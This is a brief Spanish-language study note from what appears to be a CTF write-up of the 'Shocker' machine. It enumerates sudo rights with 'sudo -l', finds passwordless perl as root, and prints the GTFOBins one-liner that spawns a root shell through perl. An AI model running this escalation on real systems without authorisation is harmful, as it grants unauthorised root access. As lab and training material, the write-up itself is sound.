#sudo #sudo-l

--------
# Usamos los comandos [[sudo]]

------
# Enumeracion
Se ejecuta el comando
```shell
sudo -l
```

![[Shocker10.png]]
Y en este caso nos muestra que podemos ejecutar el binario de perl, con permisos de root sin contraseña




# Explotacion

Asi que vamos a la pagina de [gtfobins](https://gtfobins.github.io/gtfobins/perl/#sudo) y nos da un comando para ejecutar una bash con privilegios
```bash
sudo perl -e 'exec "/bin/sh";'
```

![[Shocker11.png]]
